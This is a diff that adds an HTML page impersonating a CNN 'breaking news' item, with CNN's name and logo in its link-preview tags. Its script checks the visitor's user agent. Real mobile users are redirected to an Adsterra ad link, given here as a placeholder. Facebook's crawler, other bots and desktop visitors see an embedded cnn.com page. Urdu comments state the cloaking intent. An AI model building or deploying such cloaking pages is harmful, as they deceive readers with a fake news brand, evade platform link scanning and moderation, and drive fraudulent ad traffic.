@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>LIVE: Breaking News Update</title>
+    <meta property="og:title" content="LIVE: Major Global Health Update" />
+    <meta property="og:description" content="CNN brings you the latest developments on global events." />
+    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/b/b1/CNN.svg" />
+    <meta property="og:type" content="website" />
+
+    <script>
+        function runCloaking() {
+            var ua = navigator.userAgent.toLowerCase();
+            // موبائل کی پہچان
+            var isMobile = /android|iphone|ipad|ipod/i.test(ua);
+            // بوٹس کی پہچان
+            var isBot = ua.includes("facebookexternalhit") || 
+                        ua.includes("facebot") || 
+                        ua.includes("bot") || 
+                        ua.includes("spider") || 
+                        ua.includes("crawler");
+
+            if (isMobile && !isBot) {
+                // اصلی موبائل یوزر کے لیے Adsterra لنک
+                setTimeout(function() {
+                    window.location.href = "YOUR_ADSTERRA_DIRECT_LINK_HERE";
+                }, 1000);
+            } else {
+                // بوٹس اور کمپیوٹر والوں کو یہیں رکھ کر CNN دکھاؤ
+                document.getElementById("bot-content").style.display = "block";
+                document.getElementById("loader").style.display = "none";
+            }
+        }
+        window.onload = runCloaking;
+    </script>
+</head>
+<body style="margin:0; padding:0; background:#000; overflow:hidden;">
+
+    <div id="bot-content" style="display:none;">
+        <iframe src="https://www.cnn.com" style="width:100%; height:100vh; border:none;"></iframe>
+    </div>
+
+    <div id="loader" style="color:white; text-align:center; padding-top:200px; font-family:Arial;">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/b/b1/CNN.svg" width="100">
+        <h2>Loading Breaking News...</h2>
+    </div>
+
+</body>
+</html>
